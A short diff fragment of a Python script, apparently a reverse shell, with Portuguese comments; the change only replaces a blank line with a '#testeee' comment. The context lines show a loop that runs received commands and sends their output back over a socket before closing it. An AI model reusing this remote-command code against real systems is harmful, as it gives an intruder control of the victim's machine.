@@ -18,6 +18,6 @@ while True:
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_bytes, 'utf-8')
         s.send(output_str.encode())
-
+#testeee
 # Feche a conexão
 s.close()
